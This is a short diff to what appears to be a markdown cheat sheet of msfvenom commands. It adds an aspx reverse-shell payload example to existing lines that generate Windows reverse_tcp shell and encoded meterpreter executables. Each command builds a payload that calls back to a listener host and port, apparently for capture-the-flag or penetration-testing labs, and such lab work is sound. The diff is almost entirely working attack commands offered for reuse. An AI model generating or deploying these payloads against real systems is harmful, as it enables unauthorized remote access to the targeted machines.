@@ -31,3 +31,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp --encoder x64/shikata_ga_nai LHOST=10.10.16.6 LPORT=4444 -f exe -o shell.exe 
 ```
+#### aspx example
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.168 LPORT=443 -f aspx -o exploit.aspx
+```
